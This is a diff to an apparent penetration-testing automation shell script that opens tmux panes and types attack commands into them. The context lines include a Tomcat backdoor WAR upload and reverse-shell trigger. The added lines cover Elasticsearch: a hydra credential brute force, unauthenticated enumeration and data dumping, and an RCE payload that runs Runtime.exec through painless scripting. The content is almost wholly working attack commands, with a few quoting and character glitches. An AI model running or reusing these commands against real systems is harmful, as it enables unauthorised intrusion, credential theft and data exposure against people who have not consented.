@@ -2914,7 +2914,38 @@ tmux send-keys -t PT:35.3 "curl -u 'USER:PASS' -X PUT -F \"file=@backdoor.war\" 
 tmux send-keys -t PT:35.4 "# Tomcat: Reverse Shell - upload reverse shell by means of Application Manager. Refer to Cyber Security: guida pratica ai segreti dell’hacking etico nel 2025" Enter
 tmux send-keys -t PT:35.5 "# Tomcat: Reverse Shell - activare reverse shell" Enter
 tmux send-keys -t PT:35.5 "curl http://$ip:8080/backdoor/cfbrmtieqk.jsp"
+cd $folderProject
 
+cd $folderProjectAuthN
+# Elasticsearch
+tmux new-window -t PT:36 -n '[9200] Elasticsearch'
+tmux split-window -v -t PT:36.0
+tmux split-window -v -t PT:36.1
+tmux select-pane -t "36.1"
+tmux split-window -h -t "36.1"
+tmux split-window -h -t "36.1"
+tmux split-window -h -t "36.1"
+tmux split-window -h -t "36.1"
+tmux split-window -v -t PT:36.6
+tmux select-pane -t "36.6"
+tmux split-window -h -t "36.6"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:36.0 "# Elasticsearch: bruteforce" Enter
+tmux send-keys -t PT:36.0 "hydra -L users.txt -P passwords.txt -s 9200 $ip http-get "/_security/_authenticate" && hydra -L users.txt -P users.txt -s 9200 $ip http-get "/_security/_authenticate" && hydra -l "" -p "" -s 9200 $ip http-get "/_security/_authenticate" && hydra -l "dokntknow" -p "" -s 9200 $ip http-get "/_security/_authenticate""
+tmux send-keys -t PT:36.1 "# Elasticsearch: Information Exposure - version number" Enter
+tmux send-keys -t PT:36.1 "curl -XGET 'http://$ip:9200'"
+tmux send-keys -t PT:36.2 "# Elasticsearch: Information Exposure - verify if authentication is active" Enter
+tmux send-keys -t PT:36.2 "curl -XGET http://$ip:9200/_security/_authenticate"
+tmux send-keys -t PT:36.3 "# Elasticsearch: Information Exposure - get info from nodes" Enter
+tmux send-keys -t PT:36.3 "curl -XGET http://$ip:9200/_nodes"
+tmux send-keys -t PT:36.4 "# Elasticsearch: Information Exposure - index enumeration" Enter
+tmux send-keys -t PT:36.4 "curl http://$ip:9200/_cat/indices?v"
+tmux send-keys -t PT:36.5 "# Elasticsearch: Information Exposure - get values related on a specific index" Enter
+tmux send-keys -t PT:36.5 "curl –X POST http://$ip:9200/<index>/_search | jq ."
+tmux send-keys -t PT:36.6 "# Elasticsearch: RCE - verify if scripting is active" Enter
+tmux send-keys -t PT:36.6 "curl -u username:password -X POST \"http://$ip:9200/my_index/_search\" -H 'Content-Type: application/json' -d '{\"script_fields\":{\"test\":{\"script\":{\"source\":\"1 + 1\"}}}}'"
+tmux send-keys -t PT:36.7 "# Elasticsearch: RCE execute id" Enter
+tmux send-keys -t PT:36.7 "curl -X POST \"http://$ip:9200/_search\" -H \"Content-Type: application/json\" -d '{\"script_fields\":{\"rce\":{\"script\":{\"lang\":\"painless\",\"source\":\"java.lang.Runtime.getRuntime().exec(\"id\").text\"}}}}'"
 cd $folderProject
 
 # Attivazione della modalità interattiva
